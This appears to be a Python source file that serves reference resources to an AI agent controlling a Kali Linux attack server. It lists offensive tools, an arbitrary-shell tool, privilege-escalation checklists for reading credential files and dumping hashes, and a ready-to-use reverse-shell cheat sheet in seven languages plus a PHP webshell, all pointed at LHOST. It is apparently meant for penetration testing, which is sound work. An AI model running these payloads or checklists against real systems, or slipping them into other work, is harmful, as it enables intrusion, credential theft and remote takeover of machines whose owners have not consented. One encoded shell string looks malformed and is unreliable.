"""
client/resources.py
───────────────────
Register all @mcp.resource handlers on a FastMCP instance.

Resources are READ-ONLY — they have no side-effects and can be fetched
by the agent at any time to build context without triggering real commands.

URI scheme: kali://<category>/<item>

Import and call register_resources(mcp, kali_client) from client.py.
"""

import json

from mcp.server.fastmcp import FastMCP

from client.http_client import KaliToolsClient


def register_resources(mcp: FastMCP, kali_client: KaliToolsClient) -> None:

    @mcp.resource("kali://server/health")
    def resource_health() -> str:
        """
        Live health status of the Kali API server.

        The agent can read this before starting a workflow to know whether
        all tools are available, without being asked.
        """
        result = kali_client.check_health()
        return json.dumps(result, indent=2)

    @mcp.resource("kali://server/tools")
    def resource_tools() -> str:
        """
        Catalogue of all tools exposed by this MCP server and what they do.

        Gives the agent a reference to consult when deciding which tool to
        use for a given task, without trial-and-error.
        """
        tools = {
            # Scanning
            "nmap_scan":            "Network port scanner and service fingerprinter",
            "masscan_scan":         "Fast full-port scanner for large ranges",
            "netdiscover_scan":     "ARP host discovery on a subnet",
            # Web
            "gobuster_scan":        "Directory / DNS / vhost brute-forcer",
            "dirb_scan":            "Web content discovery scanner",
            "ffuf_fuzz":            "Fast web fuzzer — directories, params, vhosts",
            "nikto_scan":           "Web server vulnerability scanner",
            "whatweb_fingerprint":  "Web technology fingerprinter",
            "wpscan_analyze":       "WordPress vulnerability scanner",
            "sqlmap_scan":          "Automated SQL injection tester",
            "http_request":         "Make HTTP/HTTPS requests with full curl flexibility",
            # Exploitation
            "metasploit_run":       "Fire-and-forget Metasploit module via resource script",
            "msf_console":          "Interactive Metasploit session over a real PTY — use for multi-step flows, session interaction, post modules",
            "searchsploit":         "Search Exploit-DB offline archive by service/version",
            "msfvenom_generate":    "Generate reverse shell / bind shell payloads (output_file required)",
            "start_listener":       "Start a netcat listener to catch reverse shells",
            # Credentials
            "hydra_attack":         "Online password brute-forcer",
            "john_crack":           "Offline hash cracker",
            "hashcat_crack":        "GPU-accelerated hash cracking",
            # Windows / AD
            "enum4linux_scan":      "Windows / Samba enumeration",
            "smbclient_interact":   "Read and download files from SMB shares",
            "crackmapexec":         "SMB/AD Swiss army knife — spray, PTH, exec",
            # Post-exploitation
            "ssh_command":          "Run a single command on a remote host over SSH",
            "run_linpeas":          "Upload and run LinPEAS/WinPEAS for privesc enum",
            # Network / traffic
            "tshark":               "Live packet capture and traffic analysis",
            "tshark_pcap":          "Read and analyse existing .pcap files",
            "tcpdump":              "Lightweight packet capture",
            # Utility
            "execute_shell":        "Run any arbitrary shell command on the Kali server",
            "server_health":        "Check tool availability on the Kali server",
        }
        return json.dumps(tools, indent=2)

    @mcp.resource("kali://server/wordlists")
    def resource_wordlists() -> str:
        """
        Wordlists available on the Kali server.

        The agent can read this before launching Gobuster / Hydra / John
        and pick the right wordlist for the job (e.g. big.txt vs common.txt).
        """
        result = kali_client.execute_command(
            "find /usr/share/wordlists -name '*.txt' 2>/dev/null | sort | head -40"
        )
        wordlists = result.get("stdout", "No wordlists found")
        return f"Available wordlists on Kali server:\n\n{wordlists}"

    @mcp.resource("kali://server/network")
    def resource_network() -> str:
        """
        Current network interfaces and routing table on the Kali server.

        Useful at the start of a session to confirm which network the Kali
        box is on — important for choosing the right LHOST etc.
        """
        ifaces = kali_client.execute_command("ip -brief addr show")
        routes = kali_client.execute_command("ip route show")
        return (
            "=== Interfaces ===\n"
            + ifaces.get("stdout", "")
            + "\n=== Routes ===\n"
            + routes.get("stdout", "")
        )

    @mcp.resource("kali://methodology/pentest-phases")
    def resource_methodology() -> str:
        """
        Standard penetration testing methodology phases for reference.

        The agent can consult this to stay on track and not skip phases
        during an engagement.
        """
        methodology = {
            "1_reconnaissance": {
                "description": "Passive and active information gathering",
                "tools": ["nmap_scan (host discovery)", "execute_command (whois, dig, theHarvester)"],
            },
            "2_scanning": {
                "description": "Port scanning, service fingerprinting, OS detection",
                "tools": ["nmap_scan", "nikto_scan"],
            },
            "3_enumeration": {
                "description": "Extract detailed info from discovered services",
                "tools": ["enum4linux_scan", "gobuster_scan", "dirb_scan", "wpscan_analyze"],
            },
            "4_exploitation": {
                "description": "Gain access using discovered vulnerabilities",
                "tools": ["metasploit_run", "sqlmap_scan", "hydra_attack"],
            },
            "5_post_exploitation": {
                "description": "Privilege escalation, persistence, lateral movement",
                "tools": ["ssh_command", "run_linpeas", "searchsploit", "crackmapexec", "smbclient_interact"],
            },
            "6_reporting": {
                "description": "Document findings, evidence, and remediation steps",
                "tools": ["(manual — summarise all tool outputs)"],
            },
        }
        return json.dumps(methodology, indent=2)

    @mcp.resource("kali://methodology/common-ports")
    def resource_common_ports() -> str:
        """
        Common ports and associated services / attack vectors.

        The agent can use this as a lookup table after an nmap scan to
        decide which tools to run next based on open ports.
        """
        ports = {
            "21":   {"service": "FTP",        "tools": ["hydra_attack", "execute_command (anonymous login)"]},
            "22":   {"service": "SSH",        "tools": ["hydra_attack", "ssh_command"]},
            "23":   {"service": "Telnet",     "tools": ["hydra_attack"]},
            "25":   {"service": "SMTP",       "tools": ["execute_command (smtp-user-enum)"]},
            "53":   {"service": "DNS",        "tools": ["gobuster_scan (dns mode)", "execute_command (dig, dnsenum)"]},
            "80":   {"service": "HTTP",       "tools": ["whatweb_fingerprint", "nikto_scan", "gobuster_scan", "ffuf_fuzz", "sqlmap_scan", "wpscan_analyze", "http_request"]},
            "139":  {"service": "NetBIOS",    "tools": ["enum4linux_scan"]},
            "443":  {"service": "HTTPS",      "tools": ["whatweb_fingerprint", "nikto_scan", "gobuster_scan", "ffuf_fuzz", "sqlmap_scan", "http_request"]},
            "445":  {"service": "SMB",        "tools": ["enum4linux_scan", "smbclient_interact", "crackmapexec"]},
            "1433": {"service": "MSSQL",      "tools": ["sqlmap_scan", "hydra_attack", "crackmapexec (protocol=mssql)"]},
            "3306": {"service": "MySQL",      "tools": ["sqlmap_scan", "hydra_attack"]},
            "3389": {"service": "RDP",        "tools": ["hydra_attack", "crackmapexec (protocol=rdp)"]},
            "5432": {"service": "PostgreSQL", "tools": ["hydra_attack"]},
            "5985": {"service": "WinRM",      "tools": ["crackmapexec (protocol=winrm)"]},
            "8080": {"service": "HTTP-Alt",   "tools": ["whatweb_fingerprint", "nikto_scan", "gobuster_scan", "ffuf_fuzz", "sqlmap_scan"]},
            "any":  {"service": "Passive sniff", "tools": ["tshark_capture", "tcpdump_capture"]},
        }
        return json.dumps(ports, indent=2)

    @mcp.resource("kali://methodology/privesc-linux")
    def resource_privesc_linux() -> str:
        """
        Linux privilege escalation reference — checklist of vectors to check.

        The agent can consult this after getting a shell to know exactly
        what to look for before or alongside running linpeas.
        """
        privesc = {
            "1_automated_enum": {
                "description": "Run LinPEAS first — it covers most of the below automatically",
                "tools": ["run_linpeas"],
                "commands": ["run_linpeas(host, username, password)"],
            },
            "2_sudo": {
                "description": "Check sudo permissions — most common CTF privesc vector",
                "commands": ["sudo -l"],
                "notes": "Look for NOPASSWD entries. Check GTFOBins for any listed binary.",
            },
            "3_suid_binaries": {
                "description": "SUID binaries run as owner (often root)",
                "commands": ["find / -perm -4000 -type f 2>/dev/null"],
                "notes": "Cross-reference every result with GTFOBins: https://gtfobins.github.io",
            },
            "4_cron_jobs": {
                "description": "Writable scripts called by root cron = easy root",
                "commands": ["cat /etc/crontab", "ls -la /etc/cron*", "crontab -l"],
                "notes": "If a cron script is world-writable, inject a reverse shell.",
            },
            "5_writable_paths": {
                "description": "Writable /etc/passwd allows adding a root user",
                "commands": [
                    "ls -la /etc/passwd /etc/shadow",
                    "find / -writable -type f 2>/dev/null | grep -v proc",
                ],
            },
            "6_kernel_exploits": {
                "description": "Older kernels have public exploits (DirtyCow, etc.)",
                "commands": ["uname -a", "cat /proc/version"],
                "tools": ["searchsploit"],
                "notes": "searchsploit('Linux Kernel <version>') to find matching exploits",
            },
            "7_capabilities": {
                "description": "Capabilities can grant root-equivalent powers to binaries",
                "commands": ["getcap -r / 2>/dev/null"],
                "notes": "python3 with cap_setuid is instant root via os.setuid(0)",
            },
            "8_passwords_in_files": {
                "description": "Config files, history, and env vars often contain creds",
                "commands": [
                    "cat ~/.bash_history",
                    "grep -r 'password' /var/www/html 2>/dev/null",
                    "find / -name '*.conf' -readable 2>/dev/null | xargs grep -l password",
                    "env | grep -i pass",
                ],
            },
            "9_nfs_shares": {
                "description": "no_root_squash NFS exports allow root file creation",
                "commands": ["cat /etc/exports", "showmount -e localhost"],
            },
        }
        return json.dumps(privesc, indent=2)

    @mcp.resource("kali://methodology/privesc-windows")
    def resource_privesc_windows() -> str:
        """
        Windows privilege escalation reference.

        Covers the most common CTF and real-world Windows privesc vectors.
        """
        privesc = {
            "1_automated_enum": {
                "description": "Run WinPEAS first",
                "tools": ["run_linpeas (script_type=winpeas)"],
            },
            "2_token_impersonation": {
                "description": "SeImpersonatePrivilege → instant SYSTEM via Potato exploits",
                "commands": ["whoami /priv"],
                "notes": (
                    "If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled, "
                    "use PrintSpoofer, GodPotato, or JuicyPotato depending on OS version."
                ),
            },
            "3_service_misconfigs": {
                "description": "Writable service binaries or weak ACLs",
                "commands": [
                    "sc qc <service>",
                    "icacls <service_binary_path>",
                    "accesschk.exe -uwcqv * /accepteula",
                ],
            },
            "4_unquoted_service_paths": {
                "description": "Spaces in unquoted service paths allow binary hijacking",
                "commands": ["wmic service get name,pathname | findstr /i /v 'C:\\Windows'"],
            },
            "5_alwaysinstallelevated": {
                "description": "MSI files install as SYSTEM if this reg key is set",
                "commands": [
                    "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                    "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                ],
                "notes": "If both return 1: msfvenom -p windows/x64/shell_reverse_tcp -f msi -o shell.msi",
            },
            "6_stored_credentials": {
                "description": "Saved Windows credentials and config files",
                "commands": [
                    "cmdkey /list",
                    "dir /s /b *pass* *cred* *vnc* *.config 2>nul",
                    "type C:\\Unattend.xml",
                    "type C:\\Windows\\Panther\\Unattend\\Unattended.xml",
                ],
            },
            "7_pass_the_hash": {
                "description": "NTLM hash → lateral movement without cracking",
                "tools": ["crackmapexec (hash= parameter)"],
                "notes": "Dump hashes with: execute_command('secretsdump.py') or meterpreter hashdump",
            },
            "8_kerberoasting": {
                "description": "Request TGS tickets for SPNs → crack offline",
                "commands": ["GetUserSPNs.py -dc-ip <DC_IP> <domain>/<user>:<pass>"],
                "tools": ["hashcat_crack (hash_type=13100)"],
            },
        }
        return json.dumps(privesc, indent=2)

    @mcp.resource("kali://methodology/reverse-shells")
    def resource_reverse_shells() -> str:
        """
        Reverse shell one-liners for common languages and tools.

        The agent can pick the right shell based on what's available on
        the target (check with 'which python3 bash nc perl php ruby').
        Replace LHOST and LPORT before using.
        """
        shells = {
            "usage_note": (
                "Replace LHOST with your tun0 IP and LPORT with your listener port. "
                "Start start_listener(port='LPORT') before triggering the shell."
            ),
            "bash": {
                "basic":   "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
                "encoded": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9MHRVL0xQT1JUIDAmPjE=' | base64 -d | bash",
                "notes":   "Most reliable on Linux. Use when bash is available.",
            },
            "python3": {
                "shell": (
                    "python3 -c 'import socket,subprocess,os;"
                    "s=socket.socket();s.connect((\"LHOST\",LPORT));"
                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                    "subprocess.call([\"/bin/sh\",\"-i\"])'"
                ),
            },
            "python2": {
                "shell": (
                    "python -c 'import socket,subprocess,os;"
                    "s=socket.socket();s.connect((\"LHOST\",LPORT));"
                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                    "subprocess.call([\"/bin/sh\",\"-i\"])'"
                ),
            },
            "php": {
                "basic":    "php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "webshell": "<?php system($_GET['cmd']); ?>",
                "notes":    "Webshell useful when you have file upload but no direct code exec.",
            },
            "netcat": {
                "traditional": "nc -e /bin/sh LHOST LPORT",
                "without_e":   "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f",
                "notes":       "Use without_e variant — most modern nc drops -e support.",
            },
            "perl": {
                "shell": (
                    "perl -e 'use Socket;$i=\"LHOST\";$p=LPORT;"
                    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                    "connect(S,sockaddr_in($p,inet_aton($i)));"
                    "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                    "exec(\"/bin/sh -i\");'"
                ),
            },
            "ruby": {
                "shell": (
                    "ruby -rsocket -e 'exit if fork;"
                    "c=TCPSocket.new(\"LHOST\",\"LPORT\");"
                    "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
                ),
            },
            "powershell": {
                "shell": (
                    "powershell -nop -c \"$client=New-Object Net.Sockets.TCPClient('LHOST',LPORT);"
                    "$stream=$client.GetStream();"
                    "[byte[]]$bytes=0..65535|%{0};"
                    "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){"
                    "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                    "$sendback=(iex $data 2>&1|Out-String);"
                    "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
                    "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
                    "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
                    "$client.Close()\""
                ),
                "notes": "Use for Windows targets. Encode with base64 if IEX is blocked.",
            },
            "stabilise_shell": {
                "step1": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
                "step2": "Ctrl+Z  (background the shell)",
                "step3": "stty raw -echo; fg",
                "step4": "export TERM=xterm",
                "notes": "Run these steps after catching a raw nc shell for a proper TTY.",
            },
            "msfvenom_alternatives": {
                "notes": "Use msfvenom_generate tool for compiled ELF/EXE payloads with better evasion.",
            },
        }
        return json.dumps(shells, indent=2)
